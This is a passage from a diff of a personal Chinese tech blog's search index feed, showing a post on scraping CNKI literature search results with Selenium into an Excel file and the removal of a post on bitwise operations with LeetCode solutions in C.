设置网址</span></span><br><span class="line">url=<span class="string">&quot;https://kns.cnki.net/kns/advsearch?dbcode=SCDB&quot;</span></span><br><span class="line"><span class="comment"># 连接上网址</span></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 至此就成功打开了浏览器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;已成功打开浏览器，url为：&#x27;</span>,url)</span><br></pre></td></tr></table></figure>
+<p>随后就是根据不同的网页来找搜索框，输入内容，搜索</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入内容到文献来源框</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;magazine_value1&quot;]&#x27;&#x27;&#x27;</span>))).send_keys(source)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功输入来源:&quot;</span>,source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&quot;/html/body/div[2]/div[3]/div[3]/div[2]/div[1]/div[9]&quot;</span>))).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得网页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_item</span>(<span class="params">num,col=<span class="number">1</span></span>):</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        index%=<span class="number">20</span></span><br><span class="line">        title_XPATH = <span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[2]/a&#x27;</span><span class="comment">#题名</span></span><br><span class="line">        author_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[3]&#x27;</span><span class="comment">#作者</span></span><br><span class="line">        source_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[4]&#x27;</span><span class="comment">#来源</span></span><br><span class="line">        time_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[5]&#x27;</span><span class="comment">#发布时间</span></span><br><span class="line">        database_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[6]&#x27;</span><span class="comment">#数据库</span></span><br><span class="line">        refer_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[7]&#x27;</span><span class="comment">#被引</span></span><br><span class="line">        download_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[8]&#x27;</span><span class="comment">#下载</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这样模拟就成功了，但是这里还有个问题，就是来源搜索框中有自动补全，在主题中输入内容之后自动补全触发，这个时候就定为不到网页的内容了，而来源输入又没有这个问题。因此这个脚本只能往来源中输入内容，不能往主题中输入内容，如果知道怎么解决的请cue我一下（</p>
+<p>最后附上整个脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.desired_capabilities <span class="keyword">import</span> DesiredCapabilities</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">desired_capabilities = DesiredCapabilities.CHROME</span><br><span class="line">desired_capabilities[<span class="string">&quot;pageLoadStrategy&quot;</span>] = <span class="string">&quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌驱动器的环境</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置chrome不加载图片，提高速度</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.managed_default_content_settings.images&quot;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-autocomplete&quot;</span>)</span><br><span class="line"><span class="comment"># # 设置不显示窗口</span></span><br><span class="line"><span class="comment">#options.add_argument(&#x27;--headless&#x27;)</span></span><br><span class="line"><span class="comment"># 创建一个谷歌驱动器</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line"><span class="comment"># 设置搜索来源和主题</span></span><br><span class="line">source = <span class="string">&quot;经济&quot;</span></span><br><span class="line">theme = <span class="string">&quot;导购&quot;</span></span><br><span class="line"><span class="comment"># 设置所需篇数</span></span><br><span class="line">papers_need = <span class="number">100</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 设置网址</span></span><br><span class="line">url=<span class="string">&quot;https://kns.cnki.net/kns/advsearch?dbcode=SCDB&quot;</span></span><br><span class="line"><span class="comment"># 连接上网址</span></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;已成功打开浏览器，url为：&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开一个excel实例</span></span><br><span class="line">workbook=xlwt.Workbook()</span><br><span class="line">sheet=workbook.add_sheet(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;题名&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;来源&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;发表时间&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;数据库&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">5</span>,<span class="string">&#x27;被引&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">6</span>,<span class="string">&#x27;下载&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">7</span>,<span class="string">&#x27;链接&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入内容到文献来源框</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;magazine_value1&quot;]&#x27;&#x27;&#x27;</span>))).send_keys(source)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功输入来源:&quot;</span>,source)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&quot;/html/body/div[2]/div[3]/div[3]/div[2]/div[1]/div[9]&quot;</span>))).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功确认检索，得到内容.....&quot;</span>)</span><br><span class="line"><span class="comment">#获得网页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_item</span>(<span class="params">num,col=<span class="number">1</span></span>):</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        index%=<span class="number">20</span></span><br><span class="line">        title_XPATH = <span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[2]/a&#x27;</span><span class="comment">#题名</span></span><br><span class="line">        author_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[3]&#x27;</span><span class="comment">#作者</span></span><br><span class="line">        source_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[4]&#x27;</span><span class="comment">#来源</span></span><br><span class="line">        time_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[5]&#x27;</span><span class="comment">#发布时间</span></span><br><span class="line">        database_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[6]&#x27;</span><span class="comment">#数据库</span></span><br><span class="line">        refer_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[7]&#x27;</span><span class="comment">#被引</span></span><br><span class="line">        download_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[8]&#x27;</span><span class="comment">#下载</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            title = driver.find_element(By.XPATH, title_XPATH).text</span><br><span class="line">            author=driver.find_element(By.XPATH,author_XPATH).text</span><br><span class="line">            source = driver.find_element(By.XPATH, source_XPATH).text</span><br><span class="line">            times = driver.find_element(By.XPATH, time_XPATH).text</span><br><span class="line">            database = driver.find_element(By.XPATH, database_XPATH).text</span><br><span class="line">            refer = driver.find_element(By.XPATH, refer_XPATH).text</span><br><span class="line">            download = driver.find_element(By.XPATH, download_XPATH).text</span><br><span class="line">            link=driver.find_element(By.XPATH, title_XPATH).get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(title,<span class="string">&quot;\t&quot;</span>,author,source,times,database,refer,download)</span><br><span class="line">            <span class="keyword">if</span> col&lt;num:<span class="comment">#写入到excel中</span></span><br><span class="line">                sheet.write(col, <span class="number">0</span>, title)</span><br><span class="line">                sheet.write(col, <span class="number">1</span>, author)</span><br><span class="line">                sheet.write(col, <span class="number">2</span>, source)</span><br><span class="line">                sheet.write(col, <span class="number">3</span>, times)</span><br><span class="line">                sheet.write(col, <span class="number">4</span>, database)</span><br><span class="line">                sheet.write(col, <span class="number">5</span>, refer)</span><br><span class="line">                sheet.write(col, <span class="number">6</span>, download)</span><br><span class="line">                sheet.write(col, <span class="number">7</span>, link)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;所有爬取已经结束&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            col+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前页爬取结束&quot;</span>)</span><br><span class="line">            index+=<span class="number">1</span></span><br><span class="line">            <span class="comment"># 进入下一页</span></span><br><span class="line">            WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">                EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;PageNext&quot;]&#x27;&#x27;&#x27;</span>))).click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在爬取内容.....&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">get_item(papers_need)</span><br><span class="line"></span><br><span class="line">workbook.save(<span class="string">&#x27;output.xls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;爬取结果已储存在文件output.xls中&quot;</span>)</span><br><span class="line"></span><br><span class="line">driver.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>乱七八糟玩意</category>
+      </categories>
+      <tags>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -790,141 +932,6 @@
       </tags>
   </entry>
   <entry>
-    <title>位运算</title>
-    <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
-    <content><![CDATA[<p>位运算基础概念以及题目：</p>
-<span id="more"></span>
-<h3 id="概念">概念</h3>
-<h4 id="位与">位与</h4>
-<p>符号：&amp;</p>
-<p>12&amp;10—&gt;1100&amp;1010（转换为二进制）</p>
-<p>从低到高按位运算，当两个数字都为1，结果才为1，否则为0，因此结果为1000，也就是8</p>
-<h4 id="位或">位或</h4>
-<p>符号：|</p>
-<p>12|10-----&gt;1100|1010</p>
-<p>从低到高按位运算，当两个数字都为0，结果才为0，否则为1，因此结果为1110，也就是14</p>
-<p>小概念：相同的数异或为0，任何数与0异或为它本身，满足交换律和结合律</p>
-<h4 id="异或">异或</h4>
-<p>符号：^</p>
-<p>12^10-----&gt;1100^1010</p>
-<p>从低到高按位运算，当两个数字都不同，结果才为1，否则为0，因此结果为0110，也就是6。</p>
-<p>从结果来看，异或可以看作不进位的加法</p>
-<h4 id="左移">左移</h4>
-<p>符号：&lt;&lt;</p>
-<p>12&lt;&lt;3-----&gt;1100&lt;&lt;3</p>
-<p>想左移三位，末尾补零，因此结果为1100000.另外，左移一位可以看作该数字乘二。</p>
-<h4 id="右移">右移</h4>
-<p>符号: &gt;&gt;</p>
-<p>12&gt;&gt;3-----&gt;1100&gt;&gt;3=1</p>
-<p>右移三位，右移一位可看作除二向下取整</p>
-<h3 id="例题">例题</h3>
-<h4 id="2的幂">2的幂</h4>
-<p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解析：当一个数为2的幂时，他的表达方式一定为100000…，这个数n表达方式固定，n-1则确定为0111111…。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
-<h4 id="4的幂">4的幂</h4>
-<p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
-<p>解析：分析可知：$2^{2x}mod 3=1$ 且 $2^{2x+1}mod 3=2$ 因此可以得出结论$4^xmod3=1$ 。因此，当一个数n是2的幂，同时模3为1，则他一定是4的幂</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isPowerOfFour(int n)&#123;</span><br><span class="line">    return (n&gt;0)&amp;&amp;(n&amp;(n-1))==0&amp;&amp;n % 3==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="位1的个数">位1的个数</h4>
-<p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
-<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为…1000时我们把它减去1，则变为形式…0111,当我们把这两个数进行位与运算，得到的结果为…0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">uint32_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="type">int</span> ans=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        n=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="交换数字">交换数字</h4>
-<p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
-<p>解法：</p>
-<ul>
-<li>a=a^b</li>
-<li>b=a^b=a^b^b=a^0=a</li>
-<li>a=a^b=a^a^b=b</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">swapNumbers</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> aSize, <span class="type">int</span>* returnSize)</span>&#123;</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">1</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="只出现一次的数字">只出现一次的数字</h4>
-<p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum^nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解法：很巧妙的解法，根据异或的性质，我们发现当我们从头开始循环异或，出现两次的数必然可以结合异或结果为0，最后只剩下异或结果为本身的数，这个数就是出现一次的数。(草，真的牛逼)</p>
-<h4 id="汉明距离">汉明距离</h4>
-<p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
-<p>解析：把两个数字异或，我们发现结果为1的位上就是两个数字对应二进制位不同的位置，因此我们把异或后的结果进行1消去，同时统计1的个数，答案就是汉明距离。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> n=x^y;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        n=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="交替位二进制数">交替位二进制数</h4>
-<p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
-<p>解析：题目意思可以视为判断数字n的二进制表达形式是否为01连续出现，我们判断当00和11出现时对应的十进制数字为0和3，因此我们将数字n与3位与，如果符合题意，得到的结果只能是10或者01，即为1，2，如果出现0，3，则说明n中出现了00，11的组合，则返回false。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="number">3</span>)==<span class="number">0</span>||(n&amp;<span class="number">3</span>)==<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="找出所有子集的异或总和再求和">找出所有子集的异或总和再求和</h4>
-<p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
-<p>解析：这个题我搞了半天（md我怎么这么菜），首先是我们要明白一个数组的子集个数是2的元素个数的次方，因此第一个循环是为了找到所有的子集，当我们找到所有子集之后，我们要对每一个子集进行分析，因为集合中的元素在子集中只会有两种状态，0（未出现）和1（出现），因此，<strong>每个子集都可以表示为一个二进制数字</strong>，比如数组[2,3,4]的子集之一[2,3]，用相对应的二进制数字来表示就是110。这样表示完每一个子集后，我们对每一个二进制数进行分析，当我们在二进制数中寻找到1时，说明对应的数组nums[i]在子集中存在，就可以进行异或操作了，而寻找二进制数中的1可以用一个表达式来解决:<strong>i&amp;(1&lt;&lt;j)</strong>。意思是寻找二进制数i在第j位是否为1。当第二次循环遍历二进制数位数之后，我们就可以确定存在的元素，就可以进行必要的异或和相加的操作了。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,ans;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;numsSize);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) ans^=nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="两整数之和">两整数之和</h4>
-<p>阴间题目，要求不能用+，-完成两数求和。</p>
-<p><a href="https://leetcode.cn/problems/sum-of-two-integers/">https://leetcode.cn/problems/sum-of-two-integers/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(<span class="type">unsigned</span> <span class="type">int</span>)(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析：首先已知a^b可以表示为不考虑a和b的情况下a和b的加和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数&quot;b&quot;为0的时候，这个时候进位完毕，输出结果a^b就是最后答案。</p>
-<h4 id="插入">插入</h4>
-<p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertBits</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> M, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        N&amp;=~((<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>&lt;&lt;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N|(M&lt;&lt;i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解析：博主摆烂了…</p>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>C++</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于爬虫的总结</title>
-    <url>/2023/06/01/%E5%85%B3%E4%BA%8E%E7%88%AC%E8%99%AB%E7%9A%84%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>最近在某著名985学子的压力下看了看了他们的python大作业，发现完全不会（，又是日常被薄纱的一天（，然后就有了这篇总结，记录一下这几天的历程。爬虫其实是属于我一直想学，一直没学的东西，正好趁这次机会迈出第一步。</p>
-<h2 id="request库-请求分析">request库+请求分析</h2>
-<p>这是我尝试的第一种方式，但是失败了。思路是通过fiddler工具对浏览器进行抓包，通过模拟正常用户的行为来分析请求，再用request库来进行发送请求。大作业的内容是爬取知网上的文献，内容包括题名，作者。首先我们先抓包，这是刚进入网页的请求：</p>
-<p><img src="https://s2.loli.net/2023/06/02/ETd1l6pkbQX7O8m.png" alt="抓包1 - 副本.png"></p>
-<p>这里说明网页发送get请求得到初始界面，这个过程我在postman里模拟发送请求也实现了，但是问题是出现在后面的请求中。接下来就是检索关键词之后发送的post请求，拿到一个具有多个文献名称，作者等信息的检索页面，请求头和请求体如下：</p>
-<p><img src="https://s2.loli.net/2023/06/02/OsyFlIHb5Ru4twW.png" alt="抓包2 - 副本.png"></p>
-<p><img src="https://s2.loli.net/2023/06/02/XneLh5WOa3rtlIT.png" alt="抓包3 - 副本.png"></p>
-<p>这里我用postman构造请求头和请求体发送请求，但是得到的却是下面这种情况，不知道是什么原因，后来我也是放弃了这种方式。当然有知道原因的或者是知道这种方法怎么做的请cue我一下（</p>
-<p><img src="https://s2.loli.net/2023/06/02/Krcie6a2vuwMIB9.png" alt="发请求 - 副本.png"></p>
-<h2 id="用selenium模拟浏览器操作">用selenium模拟浏览器操作</h2>
-<p>selenium是一个自动化测试的工具，可以模拟浏览器的行为，这样就模拟用户搜索信息的全过程，再把内容写入excel表就行</p>
-<p>首先配置好浏览器环境和条件：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">desired_capabilities = DesiredCapabilities.CHROME</span><br><span class="line">desired_capabilities[<span class="string">&quot;pageLoadStrategy&quot;</span>] = <span class="string">&quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌驱动器的环境</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置chrome不加载图片，提高速度</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.managed_default_content_settings.images&quot;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment"># 取消自动补全，不过我好像没看出来有什么用（</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-autocomplete&quot;</span>)</span><br><span class="line"><span class="comment"># # 设置不显示窗口</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建一个谷歌驱动器</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line"><span class="comment"># 设置搜索来源</span></span><br><span class="line">source = <span class="string">&quot;经济&quot;</span></span><br><span class="line"><span class="comment"># 设置所需篇数</span></span><br><span class="line">papers_need = <span class="number">100</span></span><br><span class="line"><span 